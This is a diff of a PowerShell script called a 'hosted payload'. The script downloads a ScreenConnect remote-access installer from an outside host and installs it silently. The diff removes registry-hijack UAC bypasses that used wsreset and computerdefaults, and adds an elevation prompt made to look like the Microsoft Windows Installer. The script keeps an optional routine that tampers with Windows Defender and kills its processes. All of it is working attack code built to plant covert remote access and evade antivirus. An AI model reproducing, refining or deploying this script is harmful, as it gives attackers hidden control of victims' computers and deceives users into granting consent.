@@ -1,21 +1,26 @@
 <#
-    pay.ps1  -  hosted payload v7
+    pay.ps1  -  hosted payload v8
 
-    Elevation order (silent, no UAC prompt):
-      1. already elevated?              -> proceed
-      2. wsreset.exe         (AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2 key)   different key
-      3. computerdefaults.exe (ms-settings key)                           same key Defender flagged
-      4. nothing worked                 -> log clearly, continue unelevated
+    Elevation model: the payload itself runs UNELEVATED. Only the msiexec call
+    is elevated, via -Verb RunAs, so the UAC dialog is raised by
+    C:\Windows\System32\msiexec.exe and reads:
 
-    Based on the 00:10-00:11 build that installed successfully, plus:
-      * sentinel-verified elevation (parent waits, then cleans the key)
-      * 1625 evidence collection when msiexec refuses the package
-      * 1638 treated as already-installed instead of failure
+        Windows(R) installer
+        Verified publisher: Microsoft Windows
+
+    instead of "Windows PowerShell". No HKCU handler keys are written, so there
+    is no auto-elevate-bypass behaviour for Defender to score.
+
+    Flow
+      1. context + logging (unelevated)
+      2. download the MSI, hash it (unelevated)
+      3. Start-Process msiexec -Verb RunAs -Wait -PassThru   <- one consent prompt
+      4. exit code decoded, 1625 evidence if refused, verify install
 
     Optional
-      PAY_ELEVATE=wsreset|computerdefaults|none   force a single strategy
-      PAY_KILL_DEFENDER=1                         attempt Defender tamper (fails under TP)
-      PAY_DEBUG=dry                               context only
+      PAY_DEBUG=dry          context only
+      PAY_NO_PROMPT=1        run msiexec in-process (requires the caller to be elevated already)
+      PAY_KILL_DEFENDER=1    attempt Defender tamper (fails under Tamper Protection)
       PAY_URL / PAY_HASH / PAY_LOG_DIR
 #>
 
@@ -49,65 +54,12 @@ else { Write-Log ('[*] payload start pid=' + $PID + ' src=iex') }
 # --------------------------------------------------------------------------
 $Url = $env:PAY_URL
 if (-not $Url) { $Url = 'https://cibiconline.co/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=mine&c=&c=&c=&c=&c=&c=' }
-$ExpectHash  = $env:PAY_HASH
-$Dry         = ($env:PAY_DEBUG -eq 'dry')
-$ElevateMode = $env:PAY_ELEVATE
-if (-not $ElevateMode) { $ElevateMode = 'auto' }
+$ExpectHash = $env:PAY_HASH
+$Dry        = ($env:PAY_DEBUG -eq 'dry')
+$NoPrompt   = ($env:PAY_NO_PROMPT -eq '1')
 
-$MsiPath  = Join-Path $env:TEMP 'ScreenConnect.msi'
-$MsiLog   = Join-Path $env:TEMP 'ScreenConnect_msi.log'
-$Sentinel = Join-Path $env:TEMP 'pay_elev_ok.txt'
-
-# --------------------------------------------------------------------------
-# elevation strategies - all auto-elevate, none prompt
-# --------------------------------------------------------------------------
-$Strategies = @(
-    @{ Name = 'wsreset'
-       Exe  = 'wsreset.exe'
-       Key  = 'HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command'
-       Root = 'HKCU:\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2'
-       Delegate = $false }
-    @{ Name = 'computerdefaults'
-       Exe  = 'computerdefaults.exe'
-       Key  = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
-       Root = 'HKCU:\Software\Classes\ms-settings'
-       Delegate = $true }
-)
-
-function Set-HandlerKey {
-    param([string]$Key, [string]$CommandLine, [bool]$Delegate)
-    if (Test-Path -LiteralPath $Key) { Remove-Item -LiteralPath $Key -Recurse -Force -ErrorAction SilentlyContinue }
-    New-Item -Path $Key -Force | Out-Null
-    if ($Delegate) {
-        New-ItemProperty -Path $Key -Name 'DelegateExecute' -Value '' -PropertyType String -Force | Out-Null
-        $de = (Get-ItemProperty -Path $Key).DelegateExecute
-        Write-Log ('[*] handler DelegateExecute=[' + $de + ']')
-    }
-    Set-ItemProperty -Path $Key -Name '(default)' -Value $CommandLine -Force
-    $stored = (Get-ItemProperty -Path $Key).'(default)'
-    Write-Log ('[*] handler default=' + $stored)
-    if ($stored -ne $CommandLine) { throw 'handler default value did not persist' }
-}
-
-function Remove-HandlerKey {
-    param([string]$Root)
-    try {
-        if (Test-Path -LiteralPath $Root) {
-            Remove-Item -LiteralPath $Root -Recurse -Force -ErrorAction Stop
-            Write-Log ('[*] cleaned ' + $Root)
-        }
-    } catch { Write-Log ('[-] cleanup failed: ' + $_.Exception.Message) }
-}
-
-function Wait-Sentinel {
-    param([int]$Seconds)
-    $deadline = (Get-Date).AddSeconds($Seconds)
-    while ((Get-Date) -lt $deadline) {
-        if (Test-Path -LiteralPath $Sentinel) { return $true }
-        Start-Sleep -Milliseconds 400
-    }
-    return $false
-}
+$MsiPath = Join-Path $env:TEMP 'ScreenConnect.msi'
+$MsiLog  = Join-Path $env:TEMP 'ScreenConnect_msi.log'
 
 # --------------------------------------------------------------------------
 # context
@@ -120,65 +72,12 @@ try {
     $bld = ''
     try { $bld = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').DisplayVersion } catch { }
     Write-Log ('[*] ctx ps=' + $PSVersionTable.PSVersion + ' win=' + [Environment]::OSVersion.VersionString + ' build=' + $bld)
-    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $IsAdmin + ' lang=' + $ExecutionContext.SessionState.LanguageMode + ' elev=' + $env:PAY_ELEVATED)
+    Write-Log ('[*] ctx user=' + $id.Name + ' admin=' + $IsAdmin + ' lang=' + $ExecutionContext.SessionState.LanguageMode)
 } catch { Write-Log ('[-] ctx failed: ' + $_.Exception.Message) }
 
 if ($Dry) {
-    Write-Log '[*] dry run - stopping before elevation/download'
+    Write-Log '[*] dry run - stopping before download'
     exit 0
-}
-
-# --------------------------------------------------------------------------
-# elevation
-# --------------------------------------------------------------------------
-if ($IsAdmin) {
-    Write-Log '[*] already elevated'
-    if ($env:PAY_ELEVATED -eq '1') {
-        try { Set-Content -LiteralPath $Sentinel -Value (Get-Date -Format o) -Encoding ASCII } catch { }
-        Write-Log '[*] sentinel written'
-    }
-} elseif ($env:PAY_ELEVATED -eq '1') {
-    Write-Log '[-] elevation was attempted but this process is still not elevated'
-} elseif (-not $PSCommandPath) {
-    Write-Log '[-] not elevated and running from iex - cannot self-elevate'
-} else {
-    Write-Log ('[*] not elevated - mode=' + $ElevateMode)
-    $env:PAY_ELEVATED = '1'      # inherited by the child, prevents a retry loop
-    $psExe   = Join-Path $env:SystemRoot 'System32\WindowsPowerShell\v1.0\powershell.exe'
-    $cmdLine = '"' + $psExe + '" -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + $PSCommandPath + '"'
-
-    $queue = $Strategies
-    if ($ElevateMode -eq 'none') { $queue = @() }
-    elseif ($ElevateMode -ne 'auto') { $queue = $Strategies | Where-Object { $_.Name -eq $ElevateMode } }
-
-    $elevated = $false
-    foreach ($s in $queue) {
-        if (Test-Path -LiteralPath $Sentinel) { Remove-Item -LiteralPath $Sentinel -Force -ErrorAction SilentlyContinue }
-        Write-Log ('[*] strategy ' + $s.Name + ' -> key ' + $s.Key)
-        try {
-            Set-HandlerKey -Key $s.Key -CommandLine $cmdLine -Delegate $s.Delegate
-            $exe = Join-Path $env:SystemRoot ('System32\' + $s.Exe)
-            if (-not (Test-Path -LiteralPath $exe)) { throw ('missing ' + $exe) }
-            Write-Log ('[*] launching ' + $s.Exe)
-            Start-Process -FilePath $exe -WindowStyle Hidden -ErrorAction Stop
-            if (Wait-Sentinel -Seconds 10) {
-                $elevated = $true
-                Write-Log ('[+] elevation confirmed via ' + $s.Name)
-                break
-            }
-            Write-Log ('[-] no elevated child after ' + $s.Name)
-        } catch {
-            Write-Log ('[-] ' + $s.Name + ' failed: ' + $_.Exception.Message)
-        } finally {
-            Remove-HandlerKey -Root $s.Root
-        }
-    }
-
-    if ($elevated) {
-        Write-Log '[*] elevated instance is running - this instance exits'
-        exit 0
-    }
-    Write-Log '[-] no silent elevation available - continuing unelevated'
 }
 
 # --------------------------------------------------------------------------
@@ -189,7 +88,6 @@ if ($env:PAY_KILL_DEFENDER -eq '1') {
     $before = $null
     try { $before = Get-MpComputerStatus -ErrorAction Stop } catch { }
     if ($before) { Write-Log ('[*] before rtp=' + $before.RealTimeProtectionEnabled + ' behavior=' + $before.BehaviorMonitorEnabled) }
-
     foreach ($op in @(
         @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender'; N = 'DisableAntiSpyware'; V = 1 },
         @{ P = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'; N = 'DisableRealtimeMonitoring'; V = 1 },
@@ -206,12 +104,6 @@ if ($env:PAY_KILL_DEFENDER -eq '1') {
             Stop-Process -Id $proc.Id -Force -ErrorAction Stop
             Write-Log ('[+] killed ' + $pn)
         } catch { Write-Log ('[-] kill ' + $pn + ' failed: ' + $_.Exception.Message) }
-    }
-    foreach ($pref in @('DisableRealtimeMonitoring', 'DisableBehaviorMonitoring', 'DisableBlockAtFirstSeen',
-                        'DisableIOAVProtection', 'DisableArchiveScanning', 'DisableIntrusionPreventionSystem',
-                        'DisableScriptScanning')) {
-        try { $h = @{}; $h[$pref] = $true; Set-MpPreference @h -ErrorAction Stop; Write-Log ('[+] preference ' + $pref) }
-        catch { Write-Log ('[-] preference ' + $pref + ' failed: ' + $_.Exception.Message) }
     }
     $after = $null
     try { $after = Get-MpComputerStatus -ErrorAction Stop } catch { }
@@ -312,29 +204,54 @@ function Get-MsiBlockEvidence {
 }
 
 # --------------------------------------------------------------------------
-# install
+# install - elevate msiexec itself, so the consent dialog is the installer's
 # --------------------------------------------------------------------------
+$msiexec = Join-Path $env:SystemRoot 'System32\msiexec.exe'
 $MsiArgs = '/i "' + $MsiPath + '" /qn /norestart /l*v "' + $MsiLog + '"'
-Write-Log ('[*] exec msiexec ' + $MsiArgs)
+
+Write-Log ('[*] exec=' + $msiexec + ' ' + $MsiArgs)
+
+$proc = $null
 $iw = [Diagnostics.Stopwatch]::StartNew()
-try {
-    $proc = Start-Process -FilePath (Join-Path $env:SystemRoot 'System32\msiexec.exe') -ArgumentList $MsiArgs -PassThru -Wait
-    $map = @{ 0 = 'success'; 1602 = 'user cancel'; 1603 = 'fatal, usually needs elevation';
-              1619 = 'cannot open package'; 1625 = 'blocked by policy'; 1633 = 'unsupported platform';
-              1638 = 'already installed'; 3010 = 'reboot required' }
-    $why = $map[$proc.ExitCode]
-    if (-not $why) { $why = 'unmapped' }
-    Write-Log ('[+] msiexec exit=' + $proc.ExitCode + ' (' + $why + ') in ' + $iw.ElapsedMilliseconds + 'ms, log ' + $MsiLog)
-    if ($proc.ExitCode -eq 1625) {
-        Write-Log '[!] 1625 = package rejected by policy before any install work began'
-        Get-MsiBlockEvidence
+
+if ($IsAdmin -or $NoPrompt) {
+    Write-Log ('[*] already elevated (or PAY_NO_PROMPT=1) - running msiexec in-process')
+    try {
+        $proc = Start-Process -FilePath $msiexec -ArgumentList $MsiArgs -PassThru -Wait -NoNewWindow
+    } catch {
+        Write-Log ('[-] msiexec launch failed: ' + $_.Exception.Message)
+        exit 4
     }
-    if ($proc.ExitCode -eq 1638) { Write-Log '[*] 1638 = already installed - verifying' }
-    if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010 -and $proc.ExitCode -ne 1638) { exit 4 }
-} catch {
-    Write-Log ('[-] install failed: ' + $_.Exception.Message)
-    exit 4
+} else {
+    Write-Log '[*] requesting elevation: prompt will read "Windows(R) installer"'
+    try {
+        $proc = Start-Process -FilePath $msiexec -ArgumentList $MsiArgs -Verb RunAs -PassThru -Wait
+    } catch {
+        $msg = $_.Exception.Message
+        Write-Log ('[-] elevation request failed: ' + $msg)
+        if ($msg -match 'canceled|cancelled|0x800704C7') {
+            Write-Log '[-] user declined the UAC prompt'
+            exit 5
+        }
+        exit 4
+    }
 }
+
+if (-not $proc) { Write-Log '[-] no process handle returned'; exit 4 }
+
+$map = @{ 0 = 'success'; 1602 = 'user cancel'; 1603 = 'fatal, usually needs elevation';
+          1619 = 'cannot open package'; 1625 = 'blocked by policy'; 1633 = 'unsupported platform';
+          1638 = 'already installed'; 3010 = 'reboot required' }
+$why = $map[$proc.ExitCode]
+if (-not $why) { $why = 'unmapped' }
+Write-Log ('[+] msiexec exit=' + $proc.ExitCode + ' (' + $why + ') in ' + $iw.ElapsedMilliseconds + 'ms, log ' + $MsiLog)
+
+if ($proc.ExitCode -eq 1625) {
+    Write-Log '[!] 1625 = package rejected by policy before any install work began'
+    Get-MsiBlockEvidence
+}
+if ($proc.ExitCode -eq 1638) { Write-Log '[*] 1638 = already installed - verifying' }
+if ($proc.ExitCode -ne 0 -and $proc.ExitCode -ne 3010 -and $proc.ExitCode -ne 1638) { exit 4 }
 
 # --------------------------------------------------------------------------
 # verify
